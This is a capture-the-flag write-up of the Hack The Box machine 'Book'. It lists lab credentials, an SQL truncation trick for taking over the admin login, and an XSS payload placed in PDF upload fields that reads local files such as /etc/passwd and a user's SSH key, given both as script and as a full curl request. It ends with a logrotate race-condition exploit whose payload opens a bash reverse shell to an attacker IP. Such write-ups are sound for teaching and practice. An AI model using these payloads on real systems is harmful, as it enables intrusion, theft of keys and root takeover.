# book : 10.10.10.176

**Table Of Contents:**

<!-- TOC -->

- [book : 10.10.10.176](#book--101010176)
  - [Credentials](#credentials)
  - [Synopsis](#synopsis)
  - [Enumeration](#enumeration)
    - [Opened Ports](#opened-ports)
  - [FootHold](#foothold)
  - [Privilege Escalation](#privilege-escalation)

<!-- /TOC -->

## Credentials


| Service |  Username  |      Password      |
| :-------: | :----------: | :-------------------: |
| db.php | book_admin | I_Hate_Book_Reading |
|  mysql  |   admin   |  Sup3r_S3cur3_P455  |

---

## Synopsis

The web server was vulnerable to sql truncation attack by which we login via admin@book.htb. Collection.php file was vulnerable to xss from which we read local file including reader's id_rsa key and we get in. Logrotate service was vulnerable to race condition by which we got root access on the server.

## Enumeration

### Opened Ports

- [X] 22 (SSH)
- [X] 80 (HTTP)

---

## FootHold

- The web server is running a site based on php where there are many functionality which we have to test.
- Admin signin page found (http://book.htb/admin/index.php) & Admin mail `admin@book.htb`
- On the signup page there is a limit on email field, possibly sql truncation attack.
- If register with email `rahul@ircashemircashem` which is of 22 character then it will automatically truncate the email to `rahul@ircashemircash` which is of 20 character. So, we discovered that there is a 20 character limit on email field on signup page.
- Register with email `admin@book.htb++++++anything`, the server will truncate the email to `admin@book.htb++++++` which you can use to signin to admin panel.
- When we upload a pdf, both the input field i.e book author and title is parsing html and javascript. Using javascript to read local files.

```javascript
<p id="write-here"></p>
<script>
    var res;
    req =  new XMLHttpRequest;
    req.onload=function(){
        res = this.responseText;
        document.getElementById('write-here').textContent=res;
    };
    req.open("GET","file:///etc/passwd");
    req.send();
</script> 
```

- READING /ETC/PASSWD File:

  ```bash
  curl -i -s -k -X $'POST' \
      -H $'Host: book.htb' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: multipart/form-data; boundary=---------------------------155989631534787093513136849114' -H $'Content-Length: 1796' -H $'Origin: http://book.htb' -H $'DNT: 1' -H $'Connection: close' -H $'Referer: http://book.htb/collections.php' -H $'Upgrade-Insecure-Requests: 1' -H $'Sec-GPC: 1' \
      -b $'PHPSESSID=0j5ua1t8km43tcmme852iuk65k' \
      --data-binary $'-----------------------------155989631534787093513136849114\x0d\x0aContent-Disposition: form-data; name=\"title\"\x0d\x0a\x0d\x0a\x0d\x0a<p id=\"write-here\"> </p>\x0d\x0a<script>\x0d\x0ax=new XMLHttpRequest;\x0d\x0ax.onload=function(){\x0d\x0a\x09document.getElementById(\'write-here\').textContent=this.responseText;\x0d\x0a};\x0d\x0ax.open(\"GET\",\"file:///etc/passwd\");x.send();\x0d\x0a</script> \x0d\x0a \x0d\x0a-----------------------------155989631534787093513136849114\x0d\x0aContent-Disposition: form-data; name=\"author\"\x0d\x0a\x0d\x0aindex.php\x0d\x0a-----------------------------155989631534787093513136849114\x0d\x0aContent-Disposition: form-data; name=\"Upload\"; filename=\"root.log\"\x0d\x0aContent-Type: text/x-log\x0d\x0a\x0d\x0a/images               (Status: 301) [Size: 313] [--> http://10.10.10.176/images/]\x0a/admin                (Status: 301) [Size: 312] [--> http://10.10.10.176/admin/]\x0a/search.php           (Status: 302) [Size: 0] [--> index.php]\x0a/index.php            (Status: 200) [Size: 6800]\x0a/contact.php          (Status: 302) [Size: 0] [--> index.php]\x0a/download.php         (Status: 302) [Size: 0] [--> index.php]\x0a/profile.php          (Status: 302) [Size: 0] [--> index.php]\x0a/logout.php           (Status: 302) [Size: 0] [--> index.php]\x0a/docs                 (Status: 301) [Size: 311] [--> http://10.10.10.176/docs/]\x0a/home.php             (Status: 302) [Size: 0] [--> index.php]\x0a/db.php               (Status: 200) [Size: 0]\x0a/feedback.php         (Status: 302) [Size: 0] [--> index.php]\x0a/.                    (Status: 200) [Size: 6800]\x0a/settings.php         (Status: 302) [Size: 0] [--> index.php]\x0a/books.php            (Status: 302) [Size: 0] [--> index.php]\x0a/collections.php      (Status: 302) [Size: 0] [--> index.php]\x0a\x0d\x0a-----------------------------155989631534787093513136849114\x0d\x0aContent-Disposition: form-data; name=\"Upload\"\x0d\x0a\x0d\x0aUpload\x0d\x0a-----------------------------155989631534787093513136849114--\x0d\x0a' \
      $'http://book.htb/collections.php'
  ```
- Now got to know about user `reader`. Reading his id_rsa key. One problem arised.
- The id_rsa pdf is not showing the content properly. Converting the pdf to text didn't help but converting to html did help. Got `reader` user ✌️

---

## Privilege Escalation

logrotate is running on the server. The version was 3.11.0 which is less than 3.15.0. All the versions below 3.15.0 of logrotate vulnerable to logrotate race conditions [(Reference)](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)

```bash
2021/06/28 20:46:21 CMD: UID=0    PID=17126  | /usr/sbin/logrotate -f /root/log.cfg                                          
```

- Reader's home directory is containing the access.log and access.log.1 file which is already rotated once. To confirm whether logrotate is rotating this file or not, we can rename the access.log.1 to access.log and check if logrotate again generates the access.log.1 file.

```bash
reader@book:~$ ls -la backups/
total 12
drwxr-xr-x 2 reader reader 4096 Jun 29 06:50 .
drwxr-xr-x 7 reader reader 4096 Jun 29 06:50 ..
-rw-r--r-- 1 reader reader    0 Jun 29 06:50 access.log
-rw-r--r-- 1 reader reader   91 Jun 29 06:50 access.log.1
```

- Exploiting to gain access to root with [logrotten](https://github.com/whotwagner/logrotten)
- Payload file `payloadfile`

```text
#!/bin/bash
bash -c "bash -i >& /dev/tcp/10.10.14.16/9009 0>&1"
```

```bash
reader@book:/dev/shm$ mv ~/backups/access.log.1 ~/backups/access.log; ./logrotten -p ./payloadfile  ~/backups/access.log

```

---
